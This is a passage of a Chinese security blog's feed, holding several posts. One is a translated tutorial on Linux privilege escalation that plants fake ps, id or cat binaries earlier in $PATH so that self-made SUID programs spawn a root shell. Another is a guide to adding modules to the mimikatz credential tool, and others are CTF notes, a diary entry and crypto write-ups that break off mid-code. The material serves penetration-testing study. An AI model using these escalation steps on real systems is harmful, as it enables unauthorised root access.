    <link href="https://threst.github.io/2018/06/06/%E5%88%A9%E7%94%A8%20PATH%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%20Linux%20%E6%8F%90%E6%9D%83/"/>
    <id>https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/</id>
    <published>2018-06-06T03:13:14.000Z</published>
    <updated>2018-06-06T03:14:01.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高考加油"><a href="#高考加油" class="headerlink" title="高考加油"></a>高考加油</h1><h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>在解决了几个OSCP挑战之后，我决定写一篇关于用于Linux提权方法的文章，这对我们的渗透测试项目很有帮助。在本文中，我们将学习“操纵$PATH变量的各种方法”，以获得远程主机的根访问权，以及CTF challenges用于提权的$PATH漏洞的技术。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PATH是Linux和unix操作系统中的环境变量，它存储可执行程序的所有bin和sbin目录。当用户在终端上运行命令时，它对shell的请求是根据用户执行的命令在PATH变量的帮助下搜索可执行文件。超级用户通常还拥有/sbin和/usr/sbin条目，以便轻松执行系统管理命令。<br>使用echo命令查看用户路径。<br><code>echo $PATH</code><br>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</p><p>如果你注意到’.’在环境路径变量中，这意味着被记录的用户可以从当前目录执行二进制文件/脚本。</p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>目前，我们在<code>/home/raj</code>目录中，我们将创建一个名称为<code>/script</code>的新目录。现在在脚本目录中，我们将编写一个小c程序来调用系统二进制文件的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p><p>你可以在我们的演示中看到我们的demo.c调用ps系统二进制文件命令。</p><p><img src="https://p3.ssl.qhimg.com/t0159f31c3f43ed523c.png" alt=""></p><p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br></pre></td></tr></table></figure></p><h3 id="受害者的机虚拟机"><a href="#受害者的机虚拟机" class="headerlink" title="受害者的机虚拟机"></a>受害者的机虚拟机</h3><p>首先，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助下搜索具有SUID或4000权限的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>在上面的命令的帮助下，攻击者可以枚举任何可执行文件，这里我们还可以观察/home/raj/script/shell具有suid权限。</p><p><img src="https://p4.ssl.qhimg.com/t0144143a89451f6dbe.png" alt=""></p><p>然后我们进入/home/raj/script并看到一个可执行文件“shell”。我们运行这个文件，它看起来像正在运行ps，这是进程状态的一个真正的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><h4 id="Echo-Command"><a href="#Echo-Command" class="headerlink" title="Echo Command"></a>Echo Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h4 id="Copy-Command"><a href="#Copy-Command" class="headerlink" title="Copy Command"></a>Copy Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t018dafa3066188fc2b.png" alt=""></p><h4 id="Symlink-command"><a href="#Symlink-command" class="headerlink" title="Symlink command"></a>Symlink command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh ps</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>注意:符号链接也被称为符号链接，如果该目录具有完整的权限，它将成功地工作。在Ubuntu中，对于符号链接，我们给了/script目录的权限777。<br>因此，我们看到攻击者可以操纵环境变量路径来升级特权并获得根访问。</p><p><img src="https://p2.ssl.qhimg.com/t0111f758ef0283c98a.png" alt=""></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>重复上述步骤来配置您自己的环境中，我们将编写一个小c程序来调用系统二进制文件的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p><p>你可以在我们的demo.c正在调用id命令–它是系统二进制文件。</p><p><img src="https://p2.ssl.qhimg.com/t01372b3e8a96e1ca86.png" alt=""></p><p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell2</span><br><span class="line">chmod u+s shell2</span><br><span class="line">ls -la shell2</span><br></pre></td></tr></table></figure></p><h3 id="受害者的虚拟机"><a href="#受害者的虚拟机" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再一次，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助搜索具有SUID或4000权限的文件。在这里，我们还可以观察/home/raj/script/shell2具有suid权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>然后我们进入/home/raj/script，并看到一个可执行文件“shell2”。我们运行这个文件，它看起来像正在运行id。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./shell2</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01239db93de93649fa.png" alt=""></p><h4 id="Echo-command"><a href="#Echo-command" class="headerlink" title="Echo command"></a>Echo command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell2</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t01a9cb63912ec42e4b.png" alt=""></p><h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令从内部读取内容etc/passwd文件。然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o raj</span><br><span class="line">chmod u+s raj</span><br><span class="line">ls -la raj</span><br></pre></td></tr></table></figure></p><p><img src="https://p4.ssl.qhimg.com/t013c40160a33742c61.png" alt=""></p><h3 id="受害者的虚拟机-1"><a href="#受害者的虚拟机-1" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次破坏受害者的系统，然后转移到权限升级阶段，执行下面的命令来查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>在这里，我们还可以观察/home/raj/script/raj具有suid权限，然后进入/home/raj/script并看到一个可执行文件“raj”。所以当我们运行这个文件时，它就会输出etc/passwd文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">ls</span><br><span class="line">./raj</span><br></pre></td></tr></table></figure></p><h4 id="Nano-Editor"><a href="#Nano-Editor" class="headerlink" title="Nano Editor"></a>Nano Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">nano cat</span><br></pre></td></tr></table></figure><p>现在在终端输入/bin/bash当并保存它。</p><p><img src="https://p3.ssl.qhimg.com/t01799ac7f0d1dad684.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./raj</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://p0.ssl.qhimg.com/t014ee07fb0f0ed221c.png" alt=""></p><h2 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令来读取msg.txt是在/home/raj里面,但是/home/raj里面没有这样的文件,然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o ignite</span><br><span class="line">chmod u+s ignite</span><br><span class="line">ls -la ignite</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t01815bb5d1b2aff4ec.png" alt=""></p><h3 id="受害者的虚拟机-2"><a href="#受害者的虚拟机-2" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次损害受害者的系统，然后转移到特权升级阶段，并执行下方命令以查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>在这里，我们还可以观察/home/ raj/script/拥有suid权限，然后我们进入/home/raj/script，看到一个可执行文件“ignite”。因此，当我们运行这个文件时，它会把一个错误“cat: /home/raj/msg.”txt”的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./ignite</span><br></pre></td></tr></table></figure><h4 id="Vi-Editor"><a href="#Vi-Editor" class="headerlink" title="Vi Editor"></a>Vi Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">vi cat</span><br></pre></td></tr></table></figure><p>现在在终端输入/bin/bash当并保存它。</p><p><img src="https://p2.ssl.qhimg.com/t01ba696306656a5c53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./ignite</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://p3.ssl.qhimg.com/t018279fa8c54aceed2.png" alt=""><br>本文翻译:<a href="http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;高考加油&quot;&gt;&lt;a href=&quot;#高考加油&quot; class=&quot;headerlink&quot; title=&quot;高考加油&quot;&gt;&lt;/a&gt;高考加油&lt;/h1&gt;&lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>常见文件格式分析</title>
    <link href="https://threst.github.io/2018/06/01/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
    <id>https://threst.github.io/2018/06/01/常见文件格式分析/</id>
    <published>2018-06-01T14:13:14.000Z</published>
    <updated>2018-06-01T14:32:07.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件格式概述"><a href="#文件格式概述" class="headerlink" title="文件格式概述"></a>文件格式概述</h1><p>文件格式实质上是信息的一种特殊的编码方式，计算机在存储信息时，由于信息种类的不同，所采取的文件格式也不同，在windows系统中，计算机通常采用扩展名的方式来区分不同的文件格式，ctf中考察文件格式大致分为4的类：</p><ul><li>文本格式：<code>.txt</code>,<code>.doc</code>,<code>.docx</code></li><li>图像格式：<code>.png</code>,<code>.jpg</code>,<code>bmp</code>,<code>.gif</code></li><li>音频格式:<code>.mp3</code>,<code>.wma</code>,<code>.wav</code></li><li>视频格式:<code>.mp4</code>,<code>.rmvb</code>,<code>.avi</code></li></ul><h3 id="txt格式"><a href="#txt格式" class="headerlink" title="txt格式"></a>txt格式</h3><p>txt即英文text的缩写，通常是指windows操作系统自带的一种纯文本文件格式</p><h3 id="doc-docx格式"><a href="#doc-docx格式" class="headerlink" title="doc/docx格式"></a>doc/docx格式</h3><p>doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，的哦出现相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大</p><h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><p><code>89 50 4e 47 0d 0a 1a</code><br>属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分<br><img src="https://i.loli.net/2018/06/01/5b1158a6079eb.png" alt=""></p><p>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/</a></p><h3 id="jpeg格式"><a href="#jpeg格式" class="headerlink" title="jpeg格式"></a>jpeg格式</h3><p>属于有损压缩的与平台无关的图像格式，jpeg的压缩比高(可高达100：1),png主要是块，而jpeg主要是以段的形式<br>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/</a></p><h2 id="bmp格式"><a href="#bmp格式" class="headerlink" title="bmp格式"></a>bmp格式</h2><p>是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成<br>文件头:前面两个字节一般<code>42 4D</code>，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量</p><h2 id="gif格式"><a href="#gif格式" class="headerlink" title="gif格式"></a>gif格式</h2><p>也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本<br>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/</a></p><h3 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h3><p>mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件格式概述&quot;&gt;&lt;a href=&quot;#文件格式概述&quot; class=&quot;headerlink&quot; title=&quot;文件格式概述&quot;&gt;&lt;/a&gt;文件格式概述&lt;/h1&gt;&lt;p&gt;文件格式实质上是信息的一种特殊的编码方式，计算机在存储信息时，由于信息种类的不同，所采取的文件格式也不同，在
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>61随想</title>
    <link href="https://threst.github.io/2018/06/01/61%E9%9A%8F%E6%83%B3/"/>
    <id>https://threst.github.io/2018/06/01/61随想/</id>
    <published>2018-06-01T14:13:14.000Z</published>
    <updated>2018-06-01T14:58:02.906Z</updated>
    
    <content type="html"><![CDATA[<p>今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V,还是要多看书,又想起高三的生活,转眼一年过去了,根据朋友圈的动态来分析,他们过的都还好,离2018高考也只有6天了,一起加油吧!<br><img src="https://i.loli.net/2018/06/01/5b115eb53507e.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V
      
    
    </summary>
    
    
      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>如何在MIMIKATZ添加模块</title>
    <link href="https://threst.github.io/2018/06/01/%E5%A6%82%E4%BD%95%E5%9C%A8MIMIKATZ%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9D%97/"/>
    <id>https://threst.github.io/2018/06/01/如何在MIMIKATZ添加模块/</id>
    <published>2018-06-01T09:33:09.000Z</published>
    <updated>2018-06-01T14:47:58.943Z</updated>
    
    <content type="html"><![CDATA[<p>嗨，大家好 ！我今天要写关于“我怎样才能添加到模块到<code>mimikatz</code>中？”首先，你必须在github中克隆或<a href="https://github.com/gentilkiwi/mimikatz.git" target="_blank" rel="noopener">下载</a>。我使用Visual Studio Community 2015来打开该项目。</p><p>在尝试添加新模块之前，我们必须构建mimikatz项目。如果这里失败了，记得在下一次操作之前先修复你的开发环境。我试过了，结果成功了，让我们继续，我们在<code>/ mimikatz / modules</code>中创建自己的模块头和C文件，在这里：</p><pre><code>/mimikatz/modules/kuhl_m_littlePrince.c/mimikatz/modules/kuhl_m_littlePrince.h</code></pre><p><img src="https://p3.ssl.qhimg.com/t01a273e2c999bca5d0.jpg" alt=""><br>我将讨论在检查项目时使用的一些全局变量。了解它们的用途将有助于我们开发模块。比如全局变量<code>kuhl_m_littlePrince</code>＆ <code>kuhl_m_c_littlePrince</code>。<br>或这些类型的全局变量：<code>KUHL_M和KUHL_M_C</code>。<br><code>“KUHL_M”</code>表示Kiwi用户级高级模块。<br><code>KUHL_M</code>是由<code>kuhl_m.h</code>中的<code>“struct _KUHL_M”</code>定义的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KUHL_M &#123;</span><br><span class="line">    const wchar_t * shortName;  </span><br><span class="line">    const wchar_t * fullName;</span><br><span class="line">    const wchar_t * description;</span><br><span class="line">    const unsigned short nbCommands;</span><br><span class="line">    const KUHL_M_C * commands;</span><br><span class="line">    const PKUHL_M_C_FUNC_INIT pInit;</span><br><span class="line">    const PKUHL_M_C_FUNC_INIT pClean;</span><br><span class="line">&#125; KUHL_M, *PKUHL_M;</span><br></pre></td></tr></table></figure><p>在<code>kuhl_m.h</code>中定义的<code>struct KUHL_M</code>或<code></code> * PKUHL_M`，这个结构的参数为：</p><p>1.<code>shortName</code>用作模块名称，<br>2.<code>fullName</code>用于列出显示名称<br>3.描述用于描述模块<br>4.<code>nbcommand</code>用于命令的数量。<br>5.命令使用<code>KUL_M_C</code>中定义的模块函数列表<br>6.由于<code>“PKUHL_M_C_FUNC_INIT”</code>定义的名称是指<code>NTSTATUS</code>。<code>pInit</code>和<code>pClean</code>是<code>NTSTATUS</code>的变量类型。</p><p><code>PINIT＆pClean</code>功能不是强制性的，只是为了调用函数之前初始化模块，则当模块被卸载的原型为<code>PINIT＆pClean</code>相同：<code>NTSTATUS kuhl_m_modulename_init/clean()</code></p><p><code>“KUHL_M_C”</code>表示Kiwi用户级高级模块命令。</p><p><code>wchar_t</code>是“无符号短”。<code>PKUHL_M_C_FUNC</code>定义了一个类型为<code>“NTSTATUS”</code>的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KUHL_M_C &#123;</span><br><span class="line">    const PKUHL_M_C_FUNC pCommand;</span><br><span class="line">    const wchar_t * command;</span><br><span class="line">    const wchar_t * description;</span><br><span class="line">&#125; KUHL_M_C, *PKUHL_M_C;</span><br></pre></td></tr></table></figure><p>1.<code>pCommand</code>是我们的模块功能<br>2.<code>“command”</code>说我们如何在终端中调用这个模块<br>3.描述是对函数做什么的简要描述<code>NTSTATUS</code>类型在<code>Ntdef.h</code>中定义，系统提供的状态码在<code>Ntstatus.h</code>中定义。<br>NTSTATUS值用于传递系统信息。它们有四种类型：成功值，信息值，警告和错误值</p><p><code>NTSTATUS kuhl_m_modulename_functioname（int argc，wchar_t * argv []）;</code><br>它可以在<code>NTSTATUS</code>中返回它想要的内容，除了：<code>STATUS_FATAL_APP_EXIT</code>，需要退出mimikatz。</p><p><img src="https://p4.ssl.qhimg.com/t0147e02faf651be4b2.jpg" alt=""><br>我们在头文件中做了必要的声明并传递给了主文件。</p><p><img src="https://p0.ssl.qhimg.com/t01004a3292af5c06d6.jpg" alt=""></p><p>我们用<code>kuhl_m_modulename.h＆kuhl_m_modulename.c</code>创建了我们的模块。最后一步我们需要在<code>mimikatz.h</code>中添加模块，然后在<code>mimikatz.c</code>模块列表中添加全局变量。</p><p><img src="https://p4.ssl.qhimg.com/t012677e8bdc2423da8.jpg" alt=""><br><img src="https://p1.ssl.qhimg.com/t01fec0134d3f18ec47.jpg" alt=""></p><p>模块列表</p><p><img src="https://p5.ssl.qhimg.com/t015b205f8c018b119c.jpg" alt=""></p><p>你现在可以建立mimikatz，然后运行它！</p><p>如果你看到下面这个消息，那么你成功了！</p><p><img src="https://p4.ssl.qhimg.com/t01cfdc8c8a6fabf4fc.jpg" alt="">祝你有美好的一天^^</p><p>本文翻译:<a href="https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html" target="_blank" rel="noopener">https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;嗨，大家好 ！我今天要写关于“我怎样才能添加到模块到&lt;code&gt;mimikatz&lt;/code&gt;中？”首先，你必须在github中克隆或&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz.git&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>实验吧wp(持续更新)</title>
    <link href="https://threst.github.io/2018/05/30/%E5%AE%9E%E9%AA%8C%E5%90%A7wp/"/>
    <id>https://threst.github.io/2018/05/30/实验吧wp/</id>
    <published>2018-05-30T14:13:14.000Z</published>
    <updated>2018-06-01T14:29:42.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="疑惑的汉字"><a href="#疑惑的汉字" class="headerlink" title="疑惑的汉字"></a>疑惑的汉字</h3><p>题目： 现有一段经过加密的密文，内容如下：<br>王夫 井工 夫口 由中人 井中 夫夫 由中大。<br>请找出这段密文隐藏的消息明文。</p><p>格式：CTF{ }</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/423/crypto/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/crypto/1.html</a></p><h5 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码:"></a>当铺密码:</h5><p>就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几<br>1     2    3   4    5    6   7   8   9<br>由   中   人 工   大   王 夫 井  羊<br>所以王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125<br>CTF{RM}</p><h3 id="凯撒和某某加密"><a href="#凯撒和某某加密" class="headerlink" title="凯撒和某某加密"></a>凯撒和某某加密</h3><p>题目：aZZg/x\ZbavpZiEZp+n)o+</p><h4 id="writeup："><a href="#writeup：" class="headerlink" title="writeup："></a>writeup：</h4><p>这是整个ascii表的凯撒移动，我参照网上提供一个py代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    s=<span class="string">"aZZg/x\ZbavpZiEZp+n)o+"</span></span><br><span class="line">    <span class="comment">#ascii码表中可打印的字符</span></span><br><span class="line">    a=string.maketrans(<span class="string">''</span>, <span class="string">''</span>)[<span class="number">33</span>:<span class="number">127</span>]</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        b=a[n:]+a[:n]</span><br><span class="line">        table=string.maketrans(a,b)</span><br><span class="line">        <span class="keyword">print</span> string.translate(s,table)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="keyword">print</span> <span 